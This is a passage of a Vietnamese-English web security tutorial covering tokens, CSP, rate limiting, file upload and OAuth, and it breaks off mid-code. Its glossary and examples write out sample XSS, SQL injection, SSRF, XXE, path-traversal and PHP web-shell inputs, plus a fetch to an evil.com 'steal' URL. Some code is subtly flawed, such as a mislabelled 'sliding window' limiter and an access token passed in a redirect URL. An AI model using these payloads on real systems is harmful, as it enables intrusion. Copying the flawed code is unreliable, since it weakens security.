🟡 Medium: 27 findings
```

**After Security Implementation:**

```
✅ Critical: 0 findings
✅ High: 0 findings
🟡 Medium: 2 findings (accepted risks)
```

---

**Final Security Metrics:**

| Metric                                           | Before | After      | Improvement |
| ------------------------------------------------ | ------ | ---------- | ----------- |
| **XSS Vulnerabilities**                          | 12     | 0          | 100%        |
| **CSRF Protection**                              | 0%     | 100%       | +100%       |
| **HTTPS Traffic**                                | 80%    | 100%       | +20%        |
| **Auth Token Theft Risk**                        | High   | Low        | -90%        |
| **Brute-force Attempts Blocked**                 | 0/day  | 10,000/day | -           |
| **Security Headers Score (securityheaders.com)** | F      | A+         | +6 grades   |
| **Dependency Vulnerabilities**                   | 23     | 0          | 100%        |
| **Penetration Test Score**                       | Failed | Passed     | -           |
| **Compliance (PCI-DSS)**                         | 60%    | 100%       | +40%        |

**Key Takeaways:**

- **Defense in Depth works**: Không có "silver bullet", cần nhiều layers
- **HttpOnly Cookies > localStorage**: Cho auth tokens
- **Rate Limiting critical**: Ngăn brute-force và DDoS
- **CSP Headers powerful**: Block 95% XSS attempts
- **Monitoring essential**: Real-time detection và response
- **Regular Audits**: Security không phải "set and forget"

---

## **⚡ 7. CÁCH TỐI ƯU HÓA SECURITY**

### **🚀 Performance vs Security Trade-offs**

**Challenge:** Security measures có thể làm chậm performance. Làm sao balance?

#### **Optimization 1: Token Refresh Strategy**

**❌ Naive approach:**

```typescript
// Gửi request refresh token MỖI request
async function apiCall(url, data) {
  await refreshAccessToken(); // Chậm, không cần thiết
  return fetch(url, { body: data });
}
```

**✅ Optimized approach:**

```typescript
// Chỉ refresh khi access token gần hết hạn
let tokenRefreshPromise = null;

async function getValidToken() {
  const token = getAccessToken();
  const expiresAt = getTokenExpiry();
  const now = Date.now();

  // Refresh nếu còn < 5 phút
  if (expiresAt - now < 5 * 60 * 1000) {
    // Deduplicate: Nếu đang refresh, đợi promise đó
    if (!tokenRefreshPromise) {
      tokenRefreshPromise = refreshAccessToken().finally(() => {
        tokenRefreshPromise = null;
      });
    }
    await tokenRefreshPromise;
  }

  return getAccessToken();
}

// Axios interceptor
axios.interceptors.request.use(async (config) => {
  const token = await getValidToken();
  config.headers.Authorization = `Bearer ${token}`;
  return config;
});

// Auto retry khi token expired
axios.interceptors.response.use(
  (response) => response,
  async (error) => {
    if (error.response?.status === 401) {
      await refreshAccessToken();
      return axios.request(error.config); // Retry
    }
    return Promise.reject(error);
  }
);
```

**Impact:** ✅ Giảm 95% redundant refresh calls

---

#### **Optimization 2: CSP với Nonce (thay vì unsafe-inline)**

**Problem:** `unsafe-inline` cho phép inline scripts → giảm security

**✅ Solution: Dynamic nonce generation**

```typescript
// Backend: Generate unique nonce mỗi request
import crypto from 'crypto';

app.use((req, res, next) => {
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.cspNonce = nonce;

  res.setHeader(
    'Content-Security-Policy',
    `script-src 'self' 'nonce-${nonce}'; style-src 'self' 'nonce-${nonce}'`
  );
  next();
});

// HTML template (EJS, Pug, etc.)
app.get('/', (req, res) => {
  res.render('index', { cspNonce: res.locals.cspNonce });
});
```

```html
<!-- Frontend: Inline script với nonce -->
<script nonce="<%= cspNonce %>">
  // Inline script này được phép chạy
  console.log('Trusted inline script');
</script>

<!-- ❌ Script không có nonce → BLOCKED by CSP -->
<script>
  alert('This will be blocked');
</script>
```

**Impact:** ✅ Strict CSP mà vẫn cho phép necessary inline scripts

---

#### **Optimization 3: Rate Limiting với Sliding Window**

**❌ Fixed window problem:**

```
Window 1: 0:00-0:59 → 100 requests OK
Window 2: 1:00-1:59 → 100 requests OK

Attack: 100 requests at 0:59 + 100 requests at 1:00 = 200 requests in 1 second!
```

**✅ Sliding window algorithm:**

```typescript
import rateLimit from 'express-rate-limit';
import RedisStore from 'rate-limit-redis';

const slidingWindowLimiter = rateLimit({
  store: new RedisStore({
    client: redisClient,
    prefix: 'rate_limit:',
    sendCommand: (...args) => redisClient.call(...args),
  }),
  windowMs: 60 * 1000, // 1 phút
  max: async (req) => {
    // Dynamic limits based on user tier
    if (req.user?.isPremium) return 1000;
    if (req.user) return 100;
    return 20; // Anonymous users
  },
  standardHeaders: true,
  legacyHeaders: false,
  // Sliding window: More accurate
  skip: (req) => req.user?.isAdmin, // Skip admins
});
```

**Impact:** ✅ Chặn burst attacks, fair cho legitimate users

---

#### **Optimization 4: Lazy Load DOMPurify**

**Problem:** DOMPurify bundle size = ~80KB, không phải mọi page cần

**✅ Code splitting + lazy load:**

```typescript
// ❌ Import tất cả pages
import DOMPurify from 'dompurify';

// ✅ Lazy import khi cần
const SafeHTML = ({ html }) => {
  const [sanitized, setSanitized] = useState('');

  useEffect(() => {
    import('dompurify').then(({ default: DOMPurify }) => {
      setSanitized(DOMPurify.sanitize(html));
    });
  }, [html]);

  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
};

// Hoặc dùng React.lazy
const RichTextEditor = lazy(() => import('./RichTextEditor'));

function CommentSection() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <RichTextEditor />
    </Suspense>
  );
}
```

**Impact:** ✅ Giảm initial bundle size 80KB, faster page load

---

#### **Optimization 5: Parallel Security Checks**

**❌ Sequential checks (slow):**

```typescript
app.post('/api/transfer', async (req, res) => {
  await validateInput(req.body); // 50ms
  await checkBalance(req.user.id); // 100ms
  await verifyOTP(req.user.id, req.body.otp); // 200ms
  await checkDailyLimit(req.user.id); // 80ms
  // Total: 430ms
});
```

**✅ Parallel checks (fast):**

```typescript
app.post('/api/transfer', async (req, res) => {
  const [inputValid, balance, otpValid, withinLimit] = await Promise.all([
    validateInput(req.body),
    checkBalance(req.user.id),
    verifyOTP(req.user.id, req.body.otp),
    checkDailyLimit(req.user.id),
  ]);
  // Total: ~200ms (chỉ bằng slowest operation)

  if (!inputValid || balance < req.body.amount || !otpValid || !withinLimit) {
    return res.status(400).json({ error: 'Validation failed' });
  }

  // Process transfer
});
```

**Impact:** ✅ Giảm latency 50%, better UX

---

### **📊 Security Performance Benchmarks**

| Security Measure          | Latency Added | Mitigation Strategy        | Final Impact |
| ------------------------- | ------------- | -------------------------- | ------------ |
| **HTTPS/TLS Handshake**   | +100ms        | HTTP/2, Session resumption | +20ms        |
| **JWT Verification**      | +5ms          | Cache decoded tokens       | +1ms         |
| **Input Sanitization**    | +10ms         | Lazy load libraries        | +2ms         |
| **Rate Limiting (Redis)** | +15ms         | Connection pooling         | +5ms         |
| **CSP Header**            | 0ms           | No runtime cost            | 0ms          |
| **CSRF Token Validation** | +8ms          | Parallel checks            | +2ms         |

**Total Security Overhead:** ~30ms (acceptable cho most apps)

---

## **📝 8. TÓM TẮT KEY TAKEAWAYS**

### **🎯 Những Điểm Quan Trọng Nhất**

#### **1. Defense in Depth (Phòng Thủ Đa Tầng)**

```
Security không phải 1 giải pháp duy nhất - là HỆ THỐNG bảo vệ nhiều tầng:

🛡️ Tầng 1: HTTPS/TLS → Mã hóa transport
🛡️ Tầng 2: XSS Prevention → Sanitize input/output
🛡️ Tầng 3: CSRF Protection → Token validation
🛡️ Tầng 4: Authentication → JWT + HttpOnly cookies
🛡️ Tầng 5: Secure Storage → Tránh localStorage
🛡️ Tầng 6: API Security → Rate limiting + CORS
🛡️ Tầng 7: Security Headers → CSP, HSTS, X-Frame-Options

→ Nếu 1 tầng fail, các tầng khác vẫn protect
```

---

#### **2. HttpOnly Cookies > localStorage cho Auth Tokens**

```typescript
// ❌ NGUY HIỂM
localStorage.setItem('token', accessToken); // XSS có thể steal

// ✅ AN TOÀN
res.cookie('token', accessToken, {
  httpOnly: true, // JavaScript KHÔNG access được
  secure: true, // Chỉ gửi qua HTTPS
  sameSite: 'strict', // Ngăn CSRF
});
```

**Lý do:**

- XSS attack không steal được HttpOnly cookies
- Browser tự động gửi cookies → UX tốt
- Server-side control cookies lifecycle

---

#### **3. Never Trust Client-Side**

```typescript
// ❌ SAI: Chỉ validate ở client
if (age >= 18) {
  submitForm(); // Hacker bypass dễ dàng
}

// ✅ ĐÚNG: Validate CẢ server
// Client: UX tốt
if (age < 18) return alert('Must be 18+');

// Server: SECURITY
if (age < 18) return res.status(400).json({ error: 'Must be 18+' });
```

**Rule:** Client validation = UX, Server validation = Security

---

#### **4. CSP Headers = Powerful XSS Defense**

```typescript
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com

→ Block 95%+ XSS attacks
→ Control nguồn resources được phép load
→ Report violations để phân tích
```

---

#### **5. Rate Limiting Essential**

```typescript
// Ngăn:
• Brute-force attacks (đoán password)
• DDoS attacks
• API abuse

// Implementation:
const limiter = rateLimit({
  windowMs: 60 * 1000,
  max: 100 // Max 100 requests/phút
});
```

---

#### **6. Security = Culture, Not Checklist**

```
✅ Regular security audits (quarterly)
✅ Penetration testing (annually)
✅ Dependency scanning (automated với Snyk)
✅ Security training cho developers
✅ Incident response plan
✅ Security champions trong mỗi team
```

---

### **🚨 OWASP Top 10 Quick Reference**

| Risk                               | Attack                             | Defense                                      |
| ---------------------------------- | ---------------------------------- | -------------------------------------------- |
| **A01: Broken Access Control**     | User access unauthorized resources | Server-side authorization checks             |
| **A02: Cryptographic Failures**    | Sensitive data exposure            | Encrypt data, HTTPS, HttpOnly cookies        |
| **A03: Injection (SQL, XSS)**      | Malicious code injection           | Parameterized queries, input sanitization    |
| **A04: Insecure Design**           | Flawed security architecture       | Threat modeling, secure design patterns      |
| **A05: Security Misconfiguration** | Default configs, unused features   | Hardening, remove defaults, disable debug    |
| **A06: Vulnerable Components**     | Outdated dependencies              | npm audit, Snyk, auto-updates                |
| **A07: Auth Failures**             | Weak auth mechanisms               | Strong passwords, MFA, session timeout       |
| **A08: Data Integrity Failures**   | Insecure deserialization           | Validate serialized data, digital signatures |
| **A09: Logging Failures**          | Insufficient monitoring            | Log security events, real-time alerts        |
| **A10: SSRF**                      | Server-side request forgery        | Whitelist allowed URLs, network segmentation |

---

### **📋 Security Checklist cho Production**

```markdown
## Frontend Security Checklist

### Authentication & Authorization

- [ ] Access tokens trong HttpOnly cookies (KHÔNG localStorage)
- [ ] JWT short-lived (15 phút)
- [ ] Refresh token rotation
- [ ] Session timeout sau inactivity
- [ ] Logout clear tất cả tokens

### XSS Prevention

- [ ] DOMPurify cho user-generated HTML
- [ ] React auto-escape cho text content
- [ ] CSP headers configured
- [ ] No eval() hoặc innerHTML với untrusted data
- [ ] Sanitize URLs (javascript: protocol)

### CSRF Protection

- [ ] CSRF tokens cho state-changing requests
- [ ] SameSite cookies (Strict hoặc Lax)
- [ ] Verify Origin/Referer headers

### HTTPS/TLS

- [ ] HTTPS enforced (HTTP redirect)
- [ ] HSTS header configured
- [ ] TLS 1.2+ only
- [ ] Valid SSL certificate
- [ ] Certificate auto-renewal

### API Security

- [ ] Rate limiting implemented
- [ ] CORS restricted (NO wildcard \*)
- [ ] Input validation server-side
- [ ] Output encoding
- [ ] Error messages không leak info

### Security Headers

- [ ] Content-Security-Policy
- [ ] X-Frame-Options: DENY
- [ ] X-Content-Type-Options: nosniff
- [ ] Referrer-Policy
- [ ] Permissions-Policy

### Dependencies

- [ ] npm audit clean (0 vulnerabilities)
- [ ] Snyk monitoring enabled
- [ ] Auto-update dependencies (Dependabot)
- [ ] SRI for CDN scripts

### Sensitive Data

- [ ] Không hardcode secrets
- [ ] Environment variables cho configs
- [ ] Không log sensitive data
- [ ] Encrypt data at rest

### Monitoring & Logging

- [ ] Log security events (login, failures)
- [ ] Real-time alerts cho suspicious activities
- [ ] Log retention policy
- [ ] Incident response plan

### Testing

- [ ] Penetration testing (annually)
- [ ] Security code reviews
- [ ] Automated security scans (GitHub Actions)
- [ ] Bug bounty program
```

---

### **💡 Final Wisdom**

**"Security không phải feature có thể 'add later' - nó phải được baked in từ đầu."**

**Key Principles:**

1. **Assume Breach**: Design như thể hacker đã inside system
2. **Least Privilege**: Grant minimum permissions cần thiết
3. **Defense in Depth**: Multiple layers of protection
4. **Fail Secure**: Default deny, errors không leak info
5. **Keep it Simple**: Complex systems = more vulnerabilities
6. **Regular Updates**: Security landscape thay đổi liên tục

**Security = Journey, Not Destination**

- Threat landscape evolves → Security phải evolve
- Zero-day vulnerabilities xuất hiện → Cần monitoring
- New attack vectors → Defense strategies adapt

**Be Paranoid, But Practical:**

- Paranoid: Assume mọi input độc hại, mọi user có thể attacker
- Practical: Balance security với UX, không làm app unusable

---

## **📚 GLOSSARY - Giải Thích Các Thuật Ngữ & Viết Tắt**

### **🔤 Các Từ Viết Tắt (Abbreviations)**

| Viết Tắt          | Đầy Đủ                                              | Giải Thích                                                                      | Ví Dụ                                                                           |
| ----------------- | --------------------------------------------------- | ------------------------------------------------------------------------------- | ------------------------------------------------------------------------------- |
| **XSS**           | Cross-Site Scripting                                | Lỗ hổng cho phép hacker inject JavaScript vào trang web → đánh cắp dữ liệu user | User nhập: `<script>alert('hack')</script>`                                     |
| **CSRF**          | Cross-Site Request Forgery                          | Tấn công buộc user thực hiện hành động không mong muốn trên site đang login     | User đã login bank.com → click link evil.com → evil.com gửi request chuyển tiền |
| **SQL Injection** | SQL Code Injection                                  | Inject SQL code vào query → truy cập/xóa database                               | Input: `' OR '1'='1` → bypass login                                             |
| **HTTPS**         | HTTP Secure                                         | HTTP + TLS encryption → mã hóa dữ liệu giữa browser ↔ server                    | URL bắt đầu với `https://`                                                      |
| **TLS**           | Transport Layer Security                            | Protocol mã hóa dữ liệu khi truyền qua mạng (thay thế SSL)                      | HTTPS sử dụng TLS 1.3                                                           |
| **SSL**           | Secure Sockets Layer                                | Protocol mã hóa cũ (đã lỗi thời, thay bằng TLS)                                 | SSL 3.0 có lỗ hổng POODLE                                                       |
| **HSTS**          | HTTP Strict Transport Security                      | Header bắt buộc browser dùng HTTPS, không cho HTTP                              | `Strict-Transport-Security: max-age=31536000`                                   |
| **CSP**           | Content Security Policy                             | Header quy định nguồn nào được phép load scripts/styles/images                  | `script-src 'self' https://cdn.com`                                             |
| **CORS**          | Cross-Origin Resource Sharing                       | Cơ chế cho phép domain khác gọi API của bạn                                     | API cho phép `https://app.com` gọi `https://api.com`                            |
| **JWT**           | JSON Web Token                                      | Token chứa thông tin user được mã hóa + ký bằng secret key                      | `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...`                                       |
| **API**           | Application Programming Interface                   | Giao diện cho phép apps giao tiếp với nhau                                      | REST API: `GET /api/users`                                                      |
| **DDoS**          | Distributed Denial of Service                       | Tấn công làm quá tải server bằng hàng triệu requests                            | Botnet gửi 10 triệu requests/giây                                               |
| **MitM**          | Man-in-the-Middle                                   | Hacker chặn giữa browser ↔ server để đọc/sửa dữ liệu                            | Hacker ở quán cafe chặn WiFi public                                             |
| **2FA/MFA**       | Two-Factor/Multi-Factor Authentication              | Xác thực 2 bước (password + OTP/SMS/app)                                        | Login = password + code từ Google Authenticator                                 |
| **OTP**           | One-Time Password                                   | Mật khẩu 1 lần, hết hạn sau vài phút                                            | SMS: "Mã xác nhận: 123456 (5 phút)"                                             |
| **CAPTCHA**       | Completely Automated Public Turing test             | Test phân biệt người vs bot (chọn hình, nhập chữ)                               | "Chọn tất cả ô có đèn giao thông"                                               |
| **WAF**           | Web Application Firewall                            | Tường lửa bảo vệ web app khỏi attacks (XSS, SQL injection)                      | Cloudflare WAF, AWS WAF                                                         |
| **SRI**           | Subresource Integrity                               | Verify file từ CDN không bị sửa đổi (hash check)                                | `<script integrity="sha384-abc123...">`                                         |
| **OAuth**         | Open Authorization                                  | Protocol cho phép app truy cập dữ liệu user mà không cần password               | "Login with Google", "Login with Facebook"                                      |
| **OIDC**          | OpenID Connect                                      | Layer trên OAuth 2.0 cho authentication                                         | Google Sign-In sử dụng OIDC                                                     |
| **SAML**          | Security Assertion Markup Language                  | Protocol SSO cho enterprise (XML-based)                                         | Employee login 1 lần → truy cập tất cả apps công ty                             |
| **SSO**           | Single Sign-On                                      | Login 1 lần → truy cập nhiều apps                                               | Login Google → tự động login YouTube, Gmail, Drive                              |
| **SSRF**          | Server-Side Request Forgery                         | Trick server gửi request đến internal resources                                 | Exploit: `GET /api/image?url=http://localhost:6379`                             |
| **XXE**           | XML External Entity                                 | Inject XML entity để đọc files hoặc SSRF                                        | `<!ENTITY xxe SYSTEM "file:///etc/passwd">`                                     |
| **RCE**           | Remote Code Execution                               | Chạy code từ xa trên server (rất nguy hiểm!)                                    | Upload shell.php → chạy `system($_GET['cmd'])`                                  |
| **LFI/RFI**       | Local/Remote File Inclusion                         | Include file không an toàn → RCE                                                | `include($_GET['page'] . '.php')` → LFI                                         |
| **IDOR**          | Insecure Direct Object Reference                    | Truy cập object của user khác bằng cách thay đổi ID                             | `GET /api/user/123` → thay 123 thành 456                                        |
| **CDN**           | Content Delivery Network                            | Mạng phân phối nội dung toàn cầu (cache static files)                           | Cloudflare, AWS CloudFront                                                      |
| **PII**           | Personally Identifiable Information                 | Thông tin cá nhân nhận diện được (email, phone, SSN)                            | Email, số điện thoại, CMND/CCCD                                                 |
| **GDPR**          | General Data Protection Regulation                  | Luật bảo vệ dữ liệu cá nhân của EU                                              | Right to be forgotten, data portability                                         |
| **HIPAA**         | Health Insurance Portability and Accountability Act | Luật bảo vệ dữ liệu y tế (US)                                                   | Encrypt patient medical records                                                 |
| **PCI-DSS**       | Payment Card Industry Data Security Standard        | Chuẩn bảo mật thẻ tín dụng                                                      | Encrypt credit card numbers, no store CVV                                       |

### **🔐 Các Thuật Ngữ Bảo Mật (Security Terms)**

<details>
<summary><strong>Authentication (Xác Thực)</strong></summary>

**Định nghĩa:** Xác minh danh tính user (bạn là ai?)

**Các phương pháp:**

- **Password**: Cách phổ biến nhất (hash với bcrypt)
- **2FA/MFA**: Password + OTP/SMS/app
- **Biometric**: Vân tay, khuôn mặt
- **OAuth/OIDC**: Login with Google/Facebook

**Ví dụ:**

```typescript
// Verify user identity
const user = await User.findOne({ email });
const valid = await bcrypt.compare(password, user.passwordHash);
if (!valid) throw new Error('Sai mật khẩu');
```

</details>

<details>
<summary><strong>Authorization (Phân Quyền)</strong></summary>

**Định nghĩa:** Kiểm tra quyền truy cập (bạn được làm gì?)

**Các mô hình:**

- **RBAC** (Role-Based Access Control): Phân quyền theo role (admin, user, guest)
- **ABAC** (Attribute-Based Access Control): Phân quyền theo attributes
- **ACL** (Access Control List): Danh sách quyền cho từng resource

**Ví dụ:**

```typescript
// Check user permission
const checkPermission = (user, action) => {
  if (user.role === 'admin') return true;
  if (user.role === 'user' && action === 'read') return true;
  return false;
};
```

</details>

<details>
<summary><strong>Encryption (Mã Hóa)</strong></summary>

**Định nghĩa:** Chuyển plaintext → ciphertext (có thể giải mã)

**Các loại:**

- **Symmetric**: Cùng 1 key (AES-256)
- **Asymmetric**: 2 keys - public + private (RSA)

**Ví dụ:**

```typescript
// AES-256-GCM encryption
const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
let encrypted = cipher.update(plaintext, 'utf8', 'hex');
encrypted += cipher.final('hex');
```

</details>

<details>
<summary><strong>Hashing (Băm)</strong></summary>

**Định nghĩa:** Chuyển input → fixed-length output (KHÔNG thể giải mã)

**Use cases:**

- **Password storage**: bcrypt, argon2
- **Data integrity**: SHA-256, SHA-512
- **Search encrypted fields**: SHA-256 hash index

**Ví dụ:**

```typescript
// Hash password (one-way)
const hash = await bcrypt.hash(password, 10);
// KHÔNG thể: const password = bcrypt.decrypt(hash); ❌
```

</details>

<details>
<summary><strong>Salt (Muối)</strong></summary>

**Định nghĩa:** Random string thêm vào password trước khi hash

**Tại sao cần?** Chống rainbow table attack (precomputed hash dictionary)

**Ví dụ:**

```typescript
// Password: "123456"
// Hash without salt: "e10adc3949ba59abbe56e057f20f883e" (giống nhau cho tất cả user)
// Hash with salt: mỗi user có hash khác nhau (vì salt random)

const salt = await bcrypt.genSalt(10); // Generate random salt
const hash = await bcrypt.hash(password, salt); // "123456" + salt → unique hash
```

</details>

<details>
<summary><strong>Token</strong></summary>

**Định nghĩa:** Chuỗi ký tự đại diện cho session/authentication

**Các loại:**

- **Access Token**: Ngắn hạn (15 phút), dùng để gọi API
- **Refresh Token**: Dài hạn (7 ngày), dùng để lấy access token mới
- **CSRF Token**: Chống CSRF attack
- **API Key**: Xác thực app/service

**Ví dụ:**

```typescript
// JWT Token structure
{
  "header": { "alg": "HS256", "typ": "JWT" },
  "payload": { "userId": "123", "email": "user@example.com", "exp": 1234567890 },
  "signature": "abc123..."
}
```

</details>

<details>
<summary><strong>Cookie</strong></summary>

**Định nghĩa:** Data lưu ở browser, tự động gửi kèm mỗi request

**Attributes:**

- **httpOnly**: JavaScript không đọc được (chống XSS)
- **secure**: Chỉ gửi qua HTTPS
- **sameSite**: Chống CSRF (strict/lax/none)
- **maxAge**: Thời gian sống (seconds)

**Ví dụ:**

```typescript
res.cookie('refreshToken', token, {
  httpOnly: true, // XSS không steal được
  secure: true, // Chỉ HTTPS
  sameSite: 'strict', // Chống CSRF
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 ngày
});
```

</details>

<details>
<summary><strong>Same-Origin Policy (SOP)</strong></summary>

**Định nghĩa:** Browser chỉ cho phép JavaScript từ origin A đọc dữ liệu từ origin A

**Origin = Protocol + Domain + Port**

- `https://example.com:443` ≠ `http://example.com:80` (khác protocol)
- `https://example.com` ≠ `https://api.example.com` (khác subdomain)

**Tại sao quan trọng?** Ngăn evil.com đọc dữ liệu từ bank.com

**Ví dụ:**

```javascript
// Ở trang https://bank.com
fetch('https://api.bank.com/balance'); // ✅ Same origin
fetch('https://evil.com/steal'); // ❌ Blocked by SOP

// Nếu không có SOP:
// evil.com có thể: fetch('https://bank.com/transfer?to=hacker&amount=1000000')
// → Steal tiền (vì browser tự động gửi cookies)
```

</details>

---

## **🔐 8️⃣ ADDITIONAL SECURITY TOPICS - Các Chủ Đề Bảo Mật Bổ Sung**

### **📁 8.1. FILE UPLOAD SECURITY - Bảo Mật Upload File**

**⚠️ Vấn Đề:** File upload là vector tấn công phổ biến

**Threats:**

- Upload shell.php → RCE (Remote Code Execution)
- Upload virus/malware
- Upload file quá lớn → DoS
- Path traversal: `../../etc/passwd`

```typescript
// =====================================
// FILE UPLOAD SECURITY IMPLEMENTATION
// =====================================

import multer from 'multer';
import path from 'path';
import crypto from 'crypto';
import { promisify } from 'util';
import { exec } from 'child_process';

const execAsync = promisify(exec);

// 🛡️ A. Validate File Type (MIME Type + Extension)
const ALLOWED_MIME_TYPES = [
  'image/jpeg',
  'image/png',
  'image/gif',
  'application/pdf',
];

const ALLOWED_EXTENSIONS = ['.jpg', '.jpeg', '.png', '.gif', '.pdf'];

const validateFileType = (file: Express.Multer.File): boolean => {
  // ✅ Check 1: MIME type
  if (!ALLOWED_MIME_TYPES.includes(file.mimetype)) {
    return false;
  }

  // ✅ Check 2: File extension
  const ext = path.extname(file.originalname).toLowerCase();
  if (!ALLOWED_EXTENSIONS.includes(ext)) {
    return false;
  }

  // ✅ Check 3: Magic number (file signature)
  // Đọc bytes đầu file để verify thật sự là image
  // VD: JPEG bắt đầu với FF D8 FF, PNG với 89 50 4E 47
  const buffer = file.buffer.slice(0, 4);
  const magicNumber = buffer.toString('hex');

  const validSignatures: Record<string, string[]> = {
    'image/jpeg': ['ffd8ffe0', 'ffd8ffe1', 'ffd8ffdb'],
    'image/png': ['89504e47'],
    'image/gif': ['47494638'],
  };

  const signatures = validSignatures[file.mimetype];
  if (signatures && !signatures.some((sig) => magicNumber.startsWith(sig))) {
    return false;
  }

  return true;
};

// 🛡️ B. Sanitize Filename (Chống Path Traversal)
const sanitizeFilename = (filename: string): string => {
  // ❌ Filename nguy hiểm: "../../etc/passwd"
  // ❌ Filename nguy hiểm: "shell.php.jpg" (double extension)

  // ✅ Bước 1: Generate random filename (không dùng filename gốc)
  const ext = path.extname(filename).toLowerCase();
  const randomName = crypto.randomBytes(16).toString('hex');
  const safeFilename = `${randomName}${ext}`;

  // ✅ Bước 2: Remove path separators (/, \)
  return safeFilename.replace(/[\/\\]/g, '');
};

// 🛡️ C. Limit File Size
const MAX_FILE_SIZE = 5 * 1024 * 1024; // 5MB

const upload = multer({
  storage: multer.memoryStorage(), // Lưu trong memory để validate trước
  limits: {
    fileSize: MAX_FILE_SIZE, // Giới hạn 5MB
    files: 5, // Tối đa 5 files cùng lúc
  },
  fileFilter: (req, file, cb) => {
    // Validate file type trước khi upload
    if (!validateFileType(file)) {
      cb(new Error('File type not allowed'), false);
    } else {
      cb(null, true);
    }
  },
});

// 🛡️ D. Scan for Malware (ClamAV)
async function scanFileForVirus(filePath: string): Promise<boolean> {
  try {
    // ClamAV: Open-source antivirus
    const { stdout } = await execAsync(`clamscan --no-summary ${filePath}`);

    if (stdout.includes('FOUND')) {
      console.log('⚠️ Virus detected:', stdout);
      return false; // Virus found
    }

    return true; // Clean file
  } catch (error) {
    console.error('Virus scan failed:', error);
    return false; // Assume unsafe nếu scan fail
  }
}

// 🛡️ E. Store Outside Web Root
// ❌ BAD: Lưu trong public folder → user truy cập trực tiếp
// /public/uploads/shell.php → http://example.com/uploads/shell.php (RCE!)

// ✅ GOOD: Lưu ngoài web root
const UPLOAD_DIR = '/var/uploads'; // Ngoài /var/www/html (web root)

// Serve files qua API với authentication
app.get('/api/files/:fileId', authenticateToken, async (req, res) => {
  const fileId = req.params.fileId;

  // Get file metadata from database
  const file = await db.files.findOne({ id: fileId, userId: req.user.id });

  if (!file) {
    return res.status(404).json({ error: 'File not found' });
  }

  // ✅ Check user permission
  if (file.userId !== req.user.id && !req.user.isAdmin) {
    return res.status(403).json({ error: 'Access denied' });
  }

  // Serve file
  const filePath = path.join(UPLOAD_DIR, file.filename);
  res.download(filePath, file.originalName);
});

// 🛡️ F. Complete Upload Handler
app.post(
  '/api/upload',
  authenticateToken,
  upload.single('file'),
  async (req, res) => {
    try {
      const file = req.file;

      if (!file) {
        return res.status(400).json({ error: 'No file uploaded' });
      }

      // ✅ Validate file type
      if (!validateFileType(file)) {
        return res.status(400).json({ error: 'Invalid file type' });
      }

      // ✅ Sanitize filename
      const safeFilename = sanitizeFilename(file.originalname);

      // ✅ Save file to disk (outside web root)
      const filePath = path.join(UPLOAD_DIR, safeFilename);
      await fs.promises.writeFile(filePath, file.buffer);

      // ✅ Scan for virus
      const isClean = await scanFileForVirus(filePath);
      if (!isClean) {
        // Delete file ngay lập tức
        await fs.promises.unlink(filePath);
        return res.status(400).json({ error: 'File contains malware' });
      }

      // ✅ Save metadata to database
      const fileRecord = await db.files.create({
        id: crypto.randomUUID(),
        userId: req.user.id,
        originalName: file.originalname,
        filename: safeFilename,
        mimetype: file.mimetype,
        size: file.size,
        uploadedAt: new Date(),
      });

      res.json({
        success: true,
        file: {
          id: fileRecord.id,
          name: fileRecord.originalName,
          size: fileRecord.size,
          url: `/api/files/${fileRecord.id}`,
        },
      });
    } catch (error) {
      console.error('Upload error:', error);
      res.status(500).json({ error: 'Upload failed' });
    }
  }
);

// 📋 FILE UPLOAD SECURITY CHECKLIST
/*
✅ Validate MIME type + extension + magic number
✅ Sanitize filename (không dùng filename gốc)
✅ Limit file size
✅ Scan for malware
✅ Store outside web root
✅ Serve files via API với authentication
✅ Set correct Content-Type khi serve
✅ Implement rate limiting (chống spam upload)
✅ Log upload events
✅ Backup uploaded files
*/
```

---

### **👤 8.2. OAUTH 2.0 & OPENID CONNECT - Login with Social**

**📌 Tình huống:** Implement "Login with Google", "Login with Facebook"

**Giải thích:**

- **OAuth 2.0**: Protocol cho phép app truy cập dữ liệu user mà không cần password
- **OpenID Connect (OIDC)**: Layer trên OAuth 2.0 để authentication

```typescript
// =====================================
// OAUTH 2.0 + OIDC IMPLEMENTATION
// =====================================

import { Strategy as GoogleStrategy } from 'passport-google-oauth20';
import passport from 'passport';

// 🔐 A. Google OAuth Strategy
passport.use(
  new GoogleStrategy(
    {
      clientID: process.env.GOOGLE_CLIENT_ID!,
      clientSecret: process.env.GOOGLE_CLIENT_SECRET!,
      callbackURL: 'https://yourapp.com/auth/google/callback',
    },
    async (accessToken, refreshToken, profile, done) => {
      try {
        // ✅ Check if user exists
        let user = await db.users.findOne({ googleId: profile.id });

        if (!user) {
          // ✅ Create new user
          user = await db.users.create({
            googleId: profile.id,
            email: profile.emails[0].value,
            name: profile.displayName,
            avatar: profile.photos[0].value,
            provider: 'google',
            createdAt: new Date(),
          });
        }

        // ✅ Return user
        done(null, user);
      } catch (error) {
        done(error, null);
      }
    }
  )
);

// 🔐 B. OAuth Routes
// Step 1: Redirect to Google login page
app.get(
  '/auth/google',
  passport.authenticate('google', {
    scope: ['profile', 'email'], // Request permissions
  })
);

// Step 2: Google callback (user login thành công)
app.get(
  '/auth/google/callback',
  passport.authenticate('google', { failureRedirect: '/login' }),
  (req, res) => {
    // ✅ Generate JWT tokens
    const accessToken = jwt.sign(
      { userId: req.user.id, email: req.user.email },
      process.env.JWT_SECRET!,
      { expiresIn: '15m' }
    );

    const refreshToken = jwt.sign(
      { userId: req.user.id },
      process.env.REFRESH_TOKEN_SECRET!,
      { expiresIn: '7d' }
    );

    // ✅ Set refresh token in httpOnly cookie
    res.cookie('refreshToken', refreshToken, {
      httpOnly: true,
      secure: true,
      sameSite: 'strict',
      maxAge: 7 * 24 * 60 * 60 * 1000,
    });

    // ✅ Redirect to frontend với access token
    res.redirect(`https://yourapp.com/auth/callback?token=${accessToken}`);
  }
);

// 🔐 C. Frontend Implementation (React)
function LoginPage() {
  const handleGoogleLogin = () => {
    // Redirect to backend OAuth route
    window.location.href = 'https://api.yourapp.com/auth/google';
  };

  return (
    <div>
      <h2>Login</h2>
      <button onClick={handleGoogleLogin}>🔑 Login with Google</button>
    </div>
  );
}

// Callback handler (nhận token từ backend)
function AuthCallback() {
  useEffect(() => {
    // Extract token from URL
